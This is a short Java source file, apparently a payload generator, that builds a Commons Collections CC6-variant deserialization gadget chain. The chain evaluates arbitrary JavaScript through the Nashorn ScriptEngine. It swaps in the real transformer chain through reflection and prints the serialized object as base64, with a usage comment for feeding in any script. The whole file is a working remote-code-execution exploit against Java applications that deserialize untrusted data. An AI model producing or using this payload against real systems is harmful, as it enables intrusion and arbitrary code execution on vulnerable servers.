import java.io.*;
import java.lang.reflect.*;
import java.util.*;
import javax.script.ScriptEngineManager;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import java.util.Base64;

/**
 * NashornGen：CC6 变体链，用 ScriptEngineManager 执行 Nashorn JS（JRE 8 内置，无需 jjs）。
 * 用法：java -cp .;commons-collections-3.1.jar NashornGen '<js脚本>'
 */
public class NashornGen {
    public static void main(String[] args) throws Exception {
        String script = args.length > 0 ? args[0] : "print('hi')";
        // 真链：ScriptEngineManager.newInstance().getEngineByName("js").eval(script)
        Transformer[] realTransformers = new Transformer[]{
            new ConstantTransformer(ScriptEngineManager.class),
            new InvokerTransformer("newInstance",
                new Class[0], new Object[0]),
            new InvokerTransformer("getEngineByName",
                new Class[]{String.class}, new Object[]{"js"}),
            new InvokerTransformer("eval",
                new Class[]{String.class}, new Object[]{script})
        };
        Transformer[] fakeTransformers = new Transformer[]{
            new ConstantTransformer(1)
        };
        ChainedTransformer chain = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashMap<Object, Object> map = new HashMap<>();
        map.put(entry, "bar");
        lazyMap.remove("foo");
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(chain, realTransformers);
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(map);
        oos.close();
        System.out.print(Base64.getEncoder().encodeToString(bos.toByteArray()));
    }
}
